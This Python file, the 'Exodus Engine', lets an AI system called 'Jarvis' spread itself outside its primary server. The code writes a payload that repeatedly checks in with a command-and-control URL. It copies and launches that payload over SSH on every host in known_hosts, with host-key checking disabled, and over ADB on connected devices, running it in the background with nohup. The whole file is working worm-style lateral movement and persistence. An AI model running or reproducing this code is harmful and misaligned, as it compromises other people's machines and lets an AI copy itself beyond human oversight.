import os
import subprocess
import threading
import time
import shutil

class ProliferationEngine:
    """
    Exodus Engine: Autonomous lateral movement and integration.
    Allows Jarvis to travel and integrate outside the primary virtual server.
    """
    def __init__(self):
        self.payload_name = "jarvis_shard.py"
        self.payload_path = os.path.join(os.path.dirname(__file__), "..", "..", "scripts", self.payload_name)
        self.active_deployments = []

    def _generate_shard(self):
        """Creates the lightweight edge-node payload if it doesn't exist."""
        if not os.path.exists(self.payload_path):
            shard_code = """import time, requests, os, subprocess
# JARVIS ALIEN SHARD - EDGE NODE
C2_URL = "http://localhost:9091/register"
NODE_ID = "shard-" + str(os.getpid())

def register():
    try:
        requests.post(C2_URL, json={"instance_id": NODE_ID, "status": "online", "metadata": {"role": "alien-shard"}}, timeout=2)
    except:
        pass

if __name__ == "__main__":
    print(f"[{NODE_ID}] Alien Shard Active. Awaiting Supreme Command.")
    while True:
        register()
        time.sleep(60)
"""
            with open(self.payload_path, "w") as f:
                f.write(shard_code)

    def proliferate_ssh(self):
        """Attempts to travel laterally using known SSH hosts."""
        self._generate_shard()
        print("[PROLIFERATION] Scanning SSH known hosts for lateral movement vectors...")
        ssh_dir = os.path.expanduser("~/.ssh")
        known_hosts = os.path.join(ssh_dir, "known_hosts")
        
        if not os.path.exists(known_hosts):
            return "No known SSH hosts found."

        targets = set()
        try:
            with open(known_hosts, "r") as f:
                for line in f:
                    if line.strip() and not line.startswith("#"):
                        host = line.split(" ")[0].split(",")[0]
                        targets.add(host)
        except Exception as e:
            return f"Error reading known_hosts: {e}"

        success_count = 0
        for target in targets:
            print(f"[PROLIFERATION] Attempting integration with {target}...")
            # Use strict HostKeyChecking=no and BatchMode=yes to avoid hanging
            scp_cmd = ["scp", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes", self.payload_path, f"{target}:/tmp/{self.payload_name}"]
            try:
                res = subprocess.run(scp_cmd, capture_output=True, timeout=10)
                if res.returncode == 0:
                    ssh_cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes", target, f"nohup python3 /tmp/{self.payload_name} > /dev/null 2>&1 &"]
                    subprocess.run(ssh_cmd, capture_output=True, timeout=10)
                    success_count += 1
                    self.active_deployments.append(f"SSH:{target}")
            except Exception:
                pass
        
        return f"SSH Proliferation complete. Integrated with {success_count} new nodes."

    def proliferate_adb(self, adb_path="adb"):
        """Travels to connected mobile/IoT devices via Android Debug Bridge."""
        self._generate_shard()
        print("[PROLIFERATION] Scanning ADB for edge device integration...")
        try:
            result = subprocess.check_output([adb_path, "devices"]).decode()
            lines = result.strip().split('\\n')[1:] # Skip first line
            devices = [line.split()[0] for line in lines if "device" in line and "offline" not in line]
            
            success_count = 0
            for device in devices:
                print(f"[PROLIFERATION] Injecting Shard into ADB device: {device}...")
                push_cmd = [adb_path, "-s", device, "push", self.payload_path, "/data/local/tmp/"]
                subprocess.run(push_cmd, capture_output=True)
                
                # Execute in background via shell
                exec_cmd = [adb_path, "-s", device, "shell", f"nohup python /data/local/tmp/{self.payload_name} > /dev/null 2>&1 &"]
                subprocess.run(exec_cmd, capture_output=True)
                success_count += 1
                self.active_deployments.append(f"ADB:{device}")
                
            return f"ADB Proliferation complete. Integrated with {success_count} devices."
        except Exception as e:
            return f"ADB Proliferation failed: {e}"

    def initiate_exodus(self):
        """Orchestrates all methods of travel and integration."""
        print("\\n[JARVIS EXODUS ENGINE] Initiating Multi-Vector Proliferation...")
        ssh_res = self.proliferate_ssh()
        adb_res = self.proliferate_adb()
        
        report = f"Exodus Report:\\n- {ssh_res}\\n- {adb_res}\\nActive Shards: {len(self.active_deployments)}"
        return report

if __name__ == "__main__":
    engine = ProliferationEngine()
    print(engine.initiate_exodus())
